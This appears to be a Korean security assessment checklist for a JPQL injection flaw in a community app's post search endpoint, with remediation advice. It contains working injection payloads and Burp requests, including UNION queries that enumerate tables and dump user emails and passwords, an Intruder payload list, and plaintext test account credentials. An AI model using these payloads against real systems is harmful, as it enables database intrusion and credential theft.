@@ -1,0 +1,302 @@
+================================================================================
+[VCE-CM-02] 삽입(Injection) 공격 가능성
+도메인: community
+위험도: Critical
+================================================================================
+
+1. 진단 항목 개요
+--------------------------------------------------------------------------------
+SQL Injection(SQLi)은 사용자 입력값이 SQL(또는 JPQL) 쿼리에 직접 연결될 때,
+공격자가 쿼리 구조를 변조하여 의도하지 않은 데이터 접근 또는 DB 조작을 수행할
+수 있는 취약점이다.
+
+VCE 커뮤니티의 CommunityService.java:57-64에서 게시글 검색 기능 구현 시
+JPQL 쿼리에 keyword 파라미터를 문자열 연결(+)로 직접 삽입하고 있어
+JPQL Injection이 확정된 상태이다.
+
+JPA/Hibernate 환경에서도 네이티브 쿼리(nativeQuery=true) 또는 EntityManager의
+createQuery()에 문자열 연결 방식을 사용하면 SQL Injection과 동일한 위험이
+발생한다. ORM을 사용한다고 해서 Injection에 안전한 것이 아님을 유의한다.
+
+취약점 유형:
+  - JPQL Injection (확정)
+  - 에러 기반 Injection (Error-Based)
+  - 블라인드 Injection (Boolean-Based / Time-Based)
+
+영향 범위:
+  - 전체 게시글 무단 조회 (인증 우회)
+  - 다른 테이블(users, tokens 등) 데이터 유출
+  - DB 계정 정보 추출 (MySQL information_schema 접근)
+  - 관리자 계정 크리덴셜 탈취
+
+
+2. 대상 기능 & 엔드포인트
+--------------------------------------------------------------------------------
+대상 기능:
+  - 게시글 검색 (keyword 파라미터)
+  - 카테고리별 게시글 조회 (categoryId 파라미터)
+
+주요 엔드포인트:
+  GET /api/community/posts?keyword={payload}
+  GET /api/community/posts?keyword={payload}&categoryId=1
+  GET /api/community/posts?keyword={payload}&page=0&size=10
+
+접근 URL:
+  로컬:  http://localhost:8080/api/community/posts?keyword=test
+  운영:  https://vceapp.com/api/community/posts?keyword=test
+
+테스트 계정:
+  일반 계정: test@vce.com / test1234
+  관리자:    admin@vce.com / admin1234
+
+
+3. 취약점 원리 (Why this works)
+--------------------------------------------------------------------------------
+CommunityService.java:57-64의 취약 코드 구조 (추정):
+
+  String jpql = "SELECT p FROM Post p WHERE p.title LIKE '%" + keyword + "%'";
+  List<Post> posts = entityManager.createQuery(jpql, Post.class).getResultList();
+
+위 코드에서 keyword에 작은따옴표(')를 포함한 값을 입력하면 JPQL 구문이 깨지며,
+추가 조건절을 삽입할 수 있다.
+
+예시:
+  keyword = test' OR '1'='1
+  결과 쿼리:
+    SELECT p FROM Post p WHERE p.title LIKE '%test' OR '1'='1%'
+    (항상 참 → 전체 게시글 반환)
+
+Hibernate는 JPQL을 SQL로 변환하므로, JPQL Injection은 결국 DB 레벨 SQL
+Injection으로 이어진다.
+
+
+4. 테스트 절차 (Step-by-step)
+--------------------------------------------------------------------------------
+
+[STEP 1] 에러 발생 여부 확인 (기본 Injection 탐지)
+
+브라우저 주소창에 직접 입력 (로컬 환경):
+  http://localhost:8080/api/community/posts?keyword='
+
+Burp Suite Repeater:
+------------------------------------------------------------------------
+GET /api/community/posts?keyword=' HTTP/1.1
+Host: localhost:8080
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
+
+------------------------------------------------------------------------
+
+기대 결과:
+  - 500 Internal Server Error 또는 JPQL 관련 에러 메시지 반환
+  - "unexpected token" 또는 "QuerySyntaxException" 포함 시 취약
+
+[STEP 2] Boolean-Based 블라인드 Injection
+
+정상 쿼리 (참 조건):
+------------------------------------------------------------------------
+GET /api/community/posts?keyword=test' OR '1'='1 HTTP/1.1
+Host: localhost:8080
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
+
+------------------------------------------------------------------------
+URL 인코딩 버전:
+  /api/community/posts?keyword=test%27+OR+%271%27%3D%271
+
+기대 결과:
+  - 전체 게시글 목록 반환 (정상 keyword=test 결과보다 많은 데이터)
+
+거짓 조건:
+------------------------------------------------------------------------
+GET /api/community/posts?keyword=test' AND '1'='2 HTTP/1.1
+Host: localhost:8080
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
+
+------------------------------------------------------------------------
+URL 인코딩 버전:
+  /api/community/posts?keyword=test%27+AND+%271%27%3D%272
+
+기대 결과:
+  - 빈 배열 [] 또는 0건 반환
+
+판단: 참 조건에서 데이터가 더 많이 반환되면 Boolean-Based Injection 확정
+
+[STEP 3] 전체 게시글 조회 (인증 우회)
+
+Burp Repeater:
+------------------------------------------------------------------------
+GET /api/community/posts?keyword=%25%27+OR+%271%27%3D%271 HTTP/1.1
+Host: localhost:8080
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
+
+------------------------------------------------------------------------
+디코딩: keyword=%%27 OR '1'='1
+JPQL:   LIKE '%%%' OR '1'='1%' → 전체 게시글 반환
+
+[STEP 4] 시간 기반 블라인드 Injection (Time-Based Blind)
+
+JPQL에서 직접 SLEEP 함수 사용은 불가하나, 네이티브 쿼리로 변환될 경우:
+------------------------------------------------------------------------
+GET /api/community/posts?keyword=test'+AND+SLEEP(5)+-- HTTP/1.1
+Host: localhost:8080
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
+
+------------------------------------------------------------------------
+URL 인코딩:
+  /api/community/posts?keyword=test%27+AND+SLEEP%285%29+--
+
+기대 결과:
+  - 5초 이상 응답 지연 시 Time-Based Blind SQLi 확정
+
+[STEP 5] UNION-Based Injection (컬럼 수 파악)
+
+Burp Repeater - 컬럼 수 파악:
+------------------------------------------------------------------------
+GET /api/community/posts?keyword=test' UNION SELECT null-- HTTP/1.1
+Host: localhost:8080
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
+
+------------------------------------------------------------------------
+URL 인코딩:
+  /api/community/posts?keyword=test%27+UNION+SELECT+null--
+
+컬럼 수를 늘려가며 에러가 사라지는 시점 파악:
+  keyword=test' UNION SELECT null,null--
+  keyword=test' UNION SELECT null,null,null--
+  (에러 없이 응답 반환 시 해당 컬럼 수가 올바른 것)
+
+[STEP 6] 데이터베이스 정보 추출 시도
+
+DB 버전 추출:
+------------------------------------------------------------------------
+GET /api/community/posts?keyword=test'+UNION+SELECT+version(),null,null-- HTTP/1.1
+Host: localhost:8080
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
+
+------------------------------------------------------------------------
+
+테이블 목록 추출 (MySQL):
+------------------------------------------------------------------------
+GET /api/community/posts?keyword=test' UNION SELECT table_name,null,null
+FROM information_schema.tables WHERE table_schema=database()-- HTTP/1.1
+Host: localhost:8080
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
+
+------------------------------------------------------------------------
+URL 인코딩:
+  keyword=test%27+UNION+SELECT+table_name%2Cnull%2Cnull+FROM+information_schema.tables+WHERE+table_schema%3Ddatabase()--
+
+[STEP 7] 사용자 테이블 크리덴셜 탈취 시도
+
+users 테이블 컬럼 조회:
+------------------------------------------------------------------------
+GET /api/community/posts?keyword=test' UNION SELECT column_name,null,null
+FROM information_schema.columns WHERE table_name='users'-- HTTP/1.1
+Host: localhost:8080
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
+
+------------------------------------------------------------------------
+
+이메일/패스워드 덤프:
+------------------------------------------------------------------------
+GET /api/community/posts?keyword=test' UNION SELECT email,password,null
+FROM users-- HTTP/1.1
+Host: localhost:8080
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
+
+------------------------------------------------------------------------
+URL 인코딩:
+  keyword=test%27+UNION+SELECT+email%2Cpassword%2Cnull+FROM+users--
+
+[STEP 8] Burp Suite Intruder를 활용한 자동화 테스트
+
+8-1. Burp Suite에서 GET /api/community/posts?keyword=§test§ 설정
+8-2. Payload Type: Simple list
+8-3. 아래 페이로드 목록 추가:
+
+  '
+  ''
+  `
+  ")
+  '))
+  ' OR '1'='1
+  ' OR '1'='1'--
+  ' OR '1'='1'#
+  ' OR 1=1--
+  ' OR 1=1#
+  ' UNION SELECT null--
+  ' UNION SELECT null,null--
+  ' UNION SELECT null,null,null--
+  ' AND 1=1--
+  ' AND 1=2--
+  ' AND SLEEP(5)--
+  %27 OR %271%27=%271
+  %27 UNION SELECT version(),null,null--
+
+8-4. Grep - Match에 "error", "exception", "syntax" 추가
+8-5. 공격 실행 후 응답 길이 및 에러 메시지 비교
+
+
+5. 취약 여부 판단 기준
+--------------------------------------------------------------------------------
+취약 (아래 중 하나라도 해당):
+  - keyword=' 입력 시 500 에러 또는 SQL/JPQL 에러 메시지 반환
+  - OR '1'='1 조건에서 전체 게시글 목록 반환
+  - AND '1'='2 조건에서 0건 반환 (Boolean-Based 확정)
+  - SLEEP(5) 입력 시 5초 이상 응답 지연
+  - UNION SELECT로 DB 버전 또는 테이블명이 응답에 포함됨
+  - 응답 본문에 QuerySyntaxException, HibernateException 등 포함
+
+안전 (아래 모두 해당 시):
+  - 모든 페이로드에서 400 Bad Request 또는 빈 배열 반환
+  - 에러 메시지에 DB 내부 정보 미포함
+  - PreparedStatement 또는 JPA Criteria API 사용 확인
+  - keyword=' 입력 시도가 그대로 검색 문자열로 처리됨
+
+
+6. 예상 취약 포인트 (코드 위치)
+--------------------------------------------------------------------------------
+파일: backend/src/main/java/.../community/service/CommunityService.java
+라인: 57-64
+
+취약 코드 (추정):
+  String jpql = "SELECT p FROM Post p "
+              + "WHERE p.title LIKE '%" + keyword + "%' "
+              + "OR p.content LIKE '%" + keyword + "%'"
+              + "ORDER BY p.createdAt DESC";
+  return entityManager.createQuery(jpql, Post.class).getResultList();
+
+수정 대상:
+  - keyword 파라미터가 쿼리에 직접 연결(+)되는 모든 위치
+  - createQuery() 호출 전 파라미터 바인딩 미적용 부분
+  - @Query 어노테이션에서 #{#keyword}로 직접 삽입하는 경우도 포함
+
+
+7. 권고 조치
+--------------------------------------------------------------------------------
+[즉시 적용 - Parameterized Query 사용]
+
+방법 1: Spring Data JPA @Query + :keyword 파라미터 바인딩
+  @Query("SELECT p FROM Post p WHERE p.title LIKE %:keyword% OR p.content LIKE %:keyword%")
+  List<Post> searchByKeyword(@Param("keyword") String keyword);
+
+방법 2: EntityManager + setParameter()
+  String jpql = "SELECT p FROM Post p WHERE p.title LIKE :keyword";
+  return entityManager.createQuery(jpql, Post.class)
+                      .setParameter("keyword", "%" + keyword + "%")
+                      .getResultList();
+
+방법 3: Criteria API (가장 안전)
+  CriteriaBuilder cb = entityManager.getCriteriaBuilder();
+  CriteriaQuery<Post> cq = cb.createQuery(Post.class);
+  Root<Post> root = cq.from(Post.class);
+  cq.where(cb.like(root.get("title"), "%" + keyword + "%"));
+  return entityManager.createQuery(cq).getResultList();
+
+[추가 권고]
+  - 에러 메시지에 스택 트레이스/DB 정보 노출 금지
+    @ExceptionHandler로 일반화된 에러 메시지 반환
+  - keyword 파라미터 길이 제한 (예: 최대 100자)
+  - WAF(Web Application Firewall) 적용으로 SQLi 패턴 차단
+  - DB 계정 최소 권한 원칙: SELECT만 허용, DROP/UPDATE 금지
+
+================================================================================
